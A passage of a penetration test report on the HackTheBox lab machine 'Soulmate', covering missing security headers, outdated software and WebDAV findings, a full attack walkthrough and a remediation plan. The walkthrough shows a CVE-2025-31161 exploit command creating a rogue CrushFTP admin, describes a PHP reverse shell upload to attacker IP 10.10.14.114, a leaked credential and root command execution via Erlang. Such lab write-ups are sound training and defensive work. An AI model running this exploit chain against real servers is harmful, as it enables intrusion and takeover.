+ /: The anti-clickjacking X-Frame-Options header is not present.
+ /: The X-Content-Type-Options header is not set.
+ /: Cookie currentAuth created without the httponly flag.
+ /: Cookie PHPSESSID created without the httponly flag.
```

**Missing Headers:**
| Header | Purpose | Impact of Absence |
|--------|---------|-------------------|
| X-Frame-Options | Prevent clickjacking | Application can be embedded in malicious iframes |
| X-Content-Type-Options | Prevent MIME sniffing | Browsers may interpret files incorrectly |
| HttpOnly Flag | Prevent JavaScript cookie access | Session tokens accessible to XSS attacks |

---

### ATTACK VECTOR

*[Source: Expert Analysis]*

**Network Access Requirements:** Remote  
**Authentication Requirements:** None  
**User Interaction:** Required (user must visit malicious page or fall victim to XSS)

---

### PROOF OF CONCEPT / EVIDENCE

*[Source: scans/curl.log]*

**HTTP Response Headers:**
```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 19 Jan 2026 14:36:01 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://soulmate.htb/
```

*[Note: Security headers absent from response]*

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** LOW - Enables client-side attacks that could lead to session theft
* **Privilege Escalation Potential:** LOW - Requires successful XSS exploitation
* **Lateral Movement Capability:** N/A
* **Service Availability Concerns:** LOW

---

### LIKELIHOOD

*[Source: Expert Analysis]*

**LOW** - Exploitation requires additional vulnerabilities (XSS) or user interaction with malicious content.

---

### RECOMMENDATIONS

*[Source: Industry Best Practice, OWASP Guidelines]*

**Immediate Mitigation:**
Add the following headers to nginx configuration:

```nginx
# /etc/nginx/sites-enabled/default
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

**Cookie Configuration (PHP):**
```php
# /etc/php/8.1/fpm/php.ini
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Strict
```

---

### REFERENCES

* OWASP Secure Headers Project - https://owasp.org/www-project-secure-headers/
* MDN X-Frame-Options - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
* CWE-16 - https://cwe.mitre.org/data/definitions/16.html

---

### STATUS

**Open** - Recommended remediation

---

## FINDING ID: PT-006

**Finding Title:** Outdated Software Versions with Known Vulnerabilities

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 5.3 – Medium (aggregate)  
**Mapped Controls:**
- NIST 800-53: SI-2 (Flaw Remediation), CM-8 (System Component Inventory)
- CWE-1104: Use of Unmaintained Third Party Components

**Impact:** Potential exploitation of known vulnerabilities in outdated software components.

---

### SUMMARY

*[Source: backgrounder.log (nmap vuln scans), Nikto scans]*

Multiple software components are running outdated versions with known security vulnerabilities. While not all identified CVEs may be directly exploitable in this configuration, the presence of unpatched software indicates a gap in patch management practices.

---

### AFFECTED ASSETS

| Asset | Current Version | Issue |
| ----- | --------------- | ----- |
| nginx | 1.18.0 | Multiple CVEs including CVE-2021-23017, CVE-2022-41741, CVE-2022-41742 |
| OpenSSH | 8.9p1 | CVE-2023-38408, CVE-2023-48795, CVE-2024-6387 |
| CrushFTP | 11.W.657 | CVE-2025-31161 (Critical - exploited in PT-001) |

---

### VULNERABILITY TYPE

* **Category:** Patch Management, Outdated Software
* **Associated Weakness:** CWE-1104: Use of Unmaintained Third Party Components

---

### DESCRIPTION

*[Source: backgrounder.log - Nmap vulners script output]*

**nginx 1.18.0 Vulnerabilities (from nmap vuln scan):**
```text
| vulners: 
|   nginx 1.18.0: 
|     NGINX:CVE-2022-41741	7.8
|     NGINX:CVE-2021-23017	7.7
|     NGINX:CVE-2022-41742	7.1
```

**OpenSSH 8.9p1 Vulnerabilities (sample from nmap output):**
```text
|   cpe:/a:openbsd:openssh:8.9p1: 
|     CVE-2023-38408	9.8
|     CVE-2024-6387	8.1
|     CVE-2023-48795	5.9
```

**Nikto Identification:**
```text
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
```

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** MEDIUM - Some CVEs enable information disclosure
* **Privilege Escalation Potential:** MEDIUM - CVE-2024-6387 (regreSSHion) could enable RCE
* **Lateral Movement Capability:** LOW
* **Service Availability Concerns:** MEDIUM - Some CVEs enable DoS

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
1. Update nginx to latest stable version (1.24.x or later)
2. Update OpenSSH to latest available version for Ubuntu 22.04
3. Establish patch management policy with defined SLAs

**Long-term Corrective Actions:**
1. Implement automated vulnerability scanning (Nessus, Qualys, etc.)
2. Subscribe to security advisories for all deployed software
3. Establish regular patch cycles (monthly critical, quarterly routine)
4. Implement change management process for security updates

---

### REFERENCES

* CVE-2024-6387 (regreSSHion) - https://nvd.nist.gov/vuln/detail/CVE-2024-6387
* CVE-2023-38408 - https://nvd.nist.gov/vuln/detail/CVE-2023-38408
* nginx Security Advisories - https://nginx.org/en/security_advisories.html

---

### STATUS

**Open** - Requires patch management remediation

---

## FINDING ID: PT-007

**Finding Title:** WebDAV Enabled with Dangerous HTTP Methods

**Severity:** Medium  
**Risk Rating:** CVSS v3.1: 6.5 – Medium  
**Mapped Controls:**
- NIST 800-53: CM-7 (Least Functionality)
- CWE-16: Configuration

**Impact:** Potential for unauthorized file manipulation through WebDAV methods.

---

### SUMMARY

*[Source: scans/nmap_scan_20260119_100029/ftp.soulmate.htb_80_curl_options.txt, ftp.soulmate.htb_80_nikto.txt]*

The CrushFTP web interface (ftp.soulmate.htb) has WebDAV enabled with multiple dangerous HTTP methods including PUT, DELETE, MOVE, MKCOL, PROPFIND, and PROPPATCH. While these methods require authentication in most cases, their presence increases the attack surface.

---

### AFFECTED ASSETS

| Asset | IP / Hostname | Role | Environment |
| ----- | ------------- | ---- | ----------- |
| ftp.soulmate.htb | 10.129.231.23:80 | CrushFTP Web Interface | Production |

---

### DESCRIPTION

*[Source: scans/nmap_scan_20260119_100029/ftp.soulmate.htb_80_curl_options.txt]*

**HTTP OPTIONS Response:**
```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
MS-Author-Via: DAV
Allow: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE
DAV: 1,2, access-control, <http://apache.org/dav/propset/fs/1>
```

*[Source: Nikto scan output]*
```text
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, PUT, POST, COPY, PROPFIND, DELETE, LOCK, MKCOL, MOVE, PROPPATCH, UNLOCK, ACL, TRACE
+ HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ OPTIONS: WebDAV enabled (MKCOL UNLOCK PROPPATCH COPY PROPFIND LOCK listed as allowed).
```

**Dangerous Methods Enabled:**
| Method | Risk |
|--------|------|
| PUT | File upload/overwrite |
| DELETE | File deletion |
| MOVE | File relocation |
| MKCOL | Directory creation |
| PROPFIND | Information disclosure |

---

### IMPACT

*[Source: Expert Analysis]*

* **Data Exposure Risk:** MEDIUM - PROPFIND can enumerate directories
* **Privilege Escalation Potential:** LOW (when authenticated)
* **Lateral Movement Capability:** LOW
* **Service Availability Concerns:** MEDIUM - DELETE/MOVE could disrupt service

---

### RECOMMENDATIONS

*[Source: Industry Best Practice]*

**Immediate Mitigation:**
1. Disable WebDAV if not required for business operations
2. If required, restrict to specific directories and authenticated users only
3. Disable TRACE method to prevent XST attacks

**nginx Configuration to Restrict Methods:**
```nginx
location / {
    limit_except GET HEAD POST {
        deny all;
    }
}
```

---

### REFERENCES

* OWASP Testing Guide - WebDAV - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods
* CWE-16 - https://cwe.mitre.org/data/definitions/16.html

---

### STATUS

**Open** - Requires configuration review

---

## INTERNAL NETWORK COMPROMISE WALKTHROUGH

*[Source: Analysis of all log files - tasks.md, ssh.log, backgrounder.log, linpeas.log]*

### DETAILED WALKTHROUGH

This section documents the complete attack path from initial reconnaissance to full system compromise.

#### Phase 1: Reconnaissance and Initial Enumeration

**Timeline:** 2026-01-19 09:30 - 09:50 EST

**Actions Performed:**
1. Executed automated nmap scans against target IP 10.129.231.23
2. Performed UDP scan identifying 20 filtered ports
3. Executed vulnerability scan using nmap vulners script
4. Identified open services: SSH (22/tcp), HTTP (80/tcp)

**Key Discovery:** HTTP redirect to soulmate.htb virtual host
```
HTTP/1.1 302 Moved Temporarily
Location: http://soulmate.htb/
```

*[Source: scans/curl.log]*

#### Phase 2: Web Application Enumeration

**Timeline:** 2026-01-19 09:54 - 10:26 EST

**Actions Performed:**
1. Added soulmate.htb to /etc/hosts
2. Executed web enumeration against http://soulmate.htb
3. Ran gobuster vhost discovery
4. Discovered ftp.soulmate.htb virtual host
5. Identified CrushFTP web interface at ftp.soulmate.htb

**Key Discoveries:**
- Dating web application (soulmate.htb) with PHP backend
- CrushFTP 11.W.657 web FTP interface (ftp.soulmate.htb)
- WebDAV enabled on CrushFTP interface

*[Source: backgrounder.log, results.json]*

#### Phase 3: Vulnerability Research and Exploitation

**Timeline:** 2026-01-19 10:27 - 10:35 EST

**Actions Performed:**
1. Researched CrushFTP vulnerabilities
2. Identified CVE-2025-31161 (Authentication Bypass)
3. Cloned exploit from GitHub
4. Executed exploit to create unauthorized admin account

**Exploit Execution:**
```
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password test123
[!] User created successfully
```

*[Source: tasks.md, scripts/CVE-2025-31161/]*

#### Phase 4: Lateral Movement via CrushFTP

**Timeline:** 2026-01-19 10:35 - 10:50 EST

**Actions Performed:**
1. Logged into CrushFTP with created account
2. Accessed administrative panel
3. Modified password for existing user "ben"
4. Logged in as "ben" to access file manager
5. Identified webprod folder mapped to web root

*[Source: tasks.md]*

#### Phase 5: Remote Code Execution

**Timeline:** 2026-01-19 10:50 - 11:00 EST

**Actions Performed:**
1. Cloned PHP reverse shell from GitHub
2. Configured reverse shell with attacker IP (10.10.14.114)
3. Uploaded php-reverse-shell.php to webprod folder via CrushFTP
4. Started netcat listener on attack machine
5. Triggered reverse shell via HTTP request
6. Obtained shell as www-data user
7. Upgraded to PTY shell using Python

*[Source: tasks.md, scripts/php-reverse-shell/]*

#### Phase 6: Post-Exploitation Enumeration

**Timeline:** 2026-01-19 15:42 - 16:00 EST

**Actions Performed:**
1. Uploaded LinEnum.sh and linpeas.sh to /tmp
2. Executed enumeration scripts
3. Identified Erlang SSH service running as root
4. Discovered hardcoded credentials in Erlang configuration

**Key Discovery:**
```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]}
```

*[Source: evidence/linpeas.log, evidence/linenum.log]*

#### Phase 7: Privilege Escalation to Root

**Timeline:** 2026-01-19 16:00 - 16:10 EST

**Actions Performed:**
1. SSH authenticated as user "ben" using discovered credentials
2. Captured user flag from /home/ben/user.txt
3. Enumerated listening ports, discovered Erlang SSH on port 2222
4. SSH connected to localhost:2222 as "ben"
5. Entered Erlang interactive shell
6. Executed os:cmd("id") confirming root access
7. Captured root flag from /root/root.txt

**Root Flag Capture:**
```erlang
(ssh_runner@soulmate)3> os:cmd("cat /root/root.txt").
"38783fc88d6a9e8c3fa558c395959753\n"
```

*[Source: logs/ssh.log]*

### Attack Path Diagram

```
                                  SOULMATE ATTACK PATH
                                  ====================

┌─────────────────────────────────────────────────────────────────────────────────┐
│                              EXTERNAL ATTACKER                                   │
│                            IP: 10.10.14.114                                     │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [1] Nmap reconnaissance
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ TARGET: 10.129.231.23             │ SERVICES DISCOVERED                         │
│ ├─ SSH (22/tcp)                   │ ├─ OpenSSH 8.9p1                           │
│ ├─ HTTP (80/tcp)                  │ └─ nginx 1.18.0                            │
│ └─ EPMD (4369/tcp)                │                                            │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [2] Virtual host discovery
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ VIRTUAL HOSTS                                                                    │
│ ├─ soulmate.htb ─────────────► Dating application (PHP)                        │
│ └─ ftp.soulmate.htb ──────────► CrushFTP 11.W.657 (VULNERABLE)                │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [3] CVE-2025-31161 exploit
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ CRUSHFTP COMPROMISE                                                             │
│ ├─ Created unauthorized admin account                                           │
│ ├─ Modified 'ben' user password                                                │
│ └─ Gained file upload access to web root                                       │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [4] PHP reverse shell upload
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ INITIAL FOOTHOLD                                                                │
│ ├─ Shell as www-data (UID 33)                                                  │
│ └─ Access to /var/www/soulmate.htb/                                            │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [5] LinPEAS enumeration
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ CREDENTIAL DISCOVERY                                                            │
│ ├─ Hardcoded creds: ben:HouseH0ldings998                                       │
│ └─ Erlang SSH on localhost:2222 (root)                                         │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [6] SSH as 'ben'
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ USER ACCESS                                                                     │
│ ├─ Interactive shell as 'ben'                                                  │
│ └─ USER FLAG: 4dfab376cb5ba4ac88d9ecc5a62f243b                                │
└───────────────────────────────────┬─────────────────────────────────────────────┘
                                    │
                                    │ [7] SSH to localhost:2222
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│ ROOT ACCESS                                                                     │
│ ├─ Erlang shell with root privileges                                           │
│ ├─ os:cmd("id") = uid=0(root)                                                  │
│ └─ ROOT FLAG: 38783fc88d6a9e8c3fa558c395959753                                │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## REMEDIATION SUMMARY

*[Source: Expert Recommendations based on findings]*

This section provides a prioritized remediation roadmap based on risk and implementation effort.

### SHORT TERM (0-30 Days)

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| P1 | Patch CrushFTP to version 11.3.1+ or disable service | PT-001 |
| P1 | Remove hardcoded credentials from Erlang configuration | PT-003 |
| P1 | Change Erlang SSH service to run as non-root user | PT-004 |
| P1 | Reset all potentially compromised passwords | PT-001, PT-003 |
| P2 | Block PHP execution in upload directories | PT-002 |
| P2 | Disable unnecessary WebDAV methods | PT-007 |
| P2 | Implement security headers in nginx | PT-005 |

### MEDIUM TERM (30-90 Days)

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| P2 | Update nginx to latest stable version | PT-006 |
| P2 | Update OpenSSH to patched version | PT-006 |
| P2 | Implement secrets management solution | PT-003 |
| P2 | Deploy Web Application Firewall (WAF) | PT-001, PT-002 |
| P3 | Implement file integrity monitoring | PT-002, PT-003 |
| P3 | Configure centralized logging and SIEM integration | All |

### LONG TERM (90+ Days)

| Priority | Action | Findings Addressed |
|----------|--------|-------------------|
| P3 | Implement vulnerability scanning program | PT-006 |
| P3 | Establish regular penetration testing cadence | All |
| P3 | Deploy container security controls | PT-001, PT-004 |
| P3 | Implement zero-trust network architecture | All |
| P3 | Develop and test incident response procedures | All |

### TECHNICAL FINDINGS DETAILS

Detailed vulnerability write-ups are provided in the Findings section above (PT-001 through PT-007).

### CAVEATS

*[Source: Industry Best Practice]*

- Testing was time-bound and scope-limited to the HackTheBox lab environment
- Absence of a finding does not imply absence of vulnerability
- Some attack paths may not have been identified due to time constraints
- Additional vulnerabilities may exist in application code not tested

---

## APPENDICES

### APPENDIX A – FINDING SEVERITIES

*[Source: Industry Standard (CVSS v3.1)]*

| Rating | CVSS Score | Description |
|--------|------------|-------------|
| Critical | 9.0 - 10.0 | Exploitation is straightforward and results in total compromise |
| High | 7.0 - 8.9 | Exploitation may require specific conditions but leads to significant impact |
| Medium | 4.0 - 6.9 | Exploitation requires some conditions; moderate impact |
| Low | 0.1 - 3.9 | Limited exploitability or impact |
| Informational | 0.0 | Security best practice observation with no direct exploitability |

### APPENDIX B – EXPLOITED HOSTS

*[Source: Assessment logs]*

| Host | Method | Access Level | Flags Captured |
|------|--------|--------------|----------------|
| 10.129.231.23 (soulmate.htb) | CVE-2025-31161 → PHP shell → SSH → Erlang SSH | Root | User: 4dfab376cb5ba4ac88d9ecc5a62f243b, Root: 38783fc88d6a9e8c3fa558c395959753 |

### APPENDIX C – COMPROMISED USERS

*[Source: Assessment logs]*

| Username | Method of Compromise | Impact |
|----------|---------------------|--------|
| test | Created via CVE-2025-31161 | CrushFTP admin access |
| ben | Password modified via CrushFTP admin | SSH and system access |
| root | Erlang SSH os:cmd() execution | Full system compromise |

### APPENDIX D – CHANGES/HOST CLEANUP

*[Source: Expert recommendation]*

**Changes Made During Testing:**
1. Created CrushFTP user "test" (should be deleted)
2. Modified CrushFTP user "ben" password (should be reset)
3. Uploaded php-reverse-shell.php to /var/www/soulmate.htb/public/ (file shown as deleted in process listing)
4. Uploaded LinEnum.sh to /tmp (should be removed)
5. Uploaded linpeas.sh to /tmp (should be removed)

**Recommended Cleanup Actions:**
1. Delete unauthorized CrushFTP user "test"
2. Reset password for user "ben" to known secure value
3. Verify no malicious files remain in web directories
4. Clear /tmp of any uploaded enumeration scripts
5. Review and clear any suspicious entries from bash_history

### APPENDIX E – PASSWORD REVIEW

*[Source: Assessment observations]*

| Observation | Risk Level | Recommendation |
|-------------|------------|----------------|
| Hardcoded password "HouseH0ldings998" for user "ben" | HIGH | Rotate immediately, implement secrets management |
| CrushFTP default authentication mechanisms bypassed | CRITICAL | Update CrushFTP, enforce MFA |
| SSH allows password authentication | MEDIUM | Consider key-only authentication |
| No apparent password complexity enforcement observed | MEDIUM | Implement password policy |

### APPENDIX F – TOOLS USED

*[Source: Assessment methodology]*

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.98 | Port scanning, service enumeration, vulnerability scanning |
| Nikto | 2.5.0 | Web server vulnerability scanning |
| Gobuster | - | Virtual host and directory enumeration |
| curl | - | HTTP header analysis, manual testing |
| Python3 | - | CVE-2025-31161 exploit execution |
| PHP Reverse Shell | Pentestmonkey | Initial foothold |
| LinPEAS | Latest | Post-exploitation enumeration |
| LinEnum | 0.982 | Post-exploitation enumeration |
| SSH | - | Remote access |

### APPENDIX G – LOG FILE REFERENCES

*[Source: Case file directory structure]*

| Log File | Description |
|----------|-------------|
| backgrounder.log | Automated scan execution logs |
| logs/ssh.log | SSH session and Erlang shell transcript |
| evidence/linpeas.log | LinPEAS enumeration output |
| evidence/linenum.log | LinEnum enumeration output |
| scans/curl.log | HTTP header analysis |
| scans/nmap_scan_*/\*.nmap | Nmap scan results |
| scans/\*_nikto.txt | Nikto web scanner results |
| results.json | Web reconnaissance extracted data |
| tasks.md | Manual testing notes and procedures |

---

**END OF REPORT**

*Report Generated: January 19, 2026*  
*Classification: Educational/Training Assessment*  
*This report was generated based on log file analysis. All findings are derived from executed scans and manual testing notes documented in the case files.*
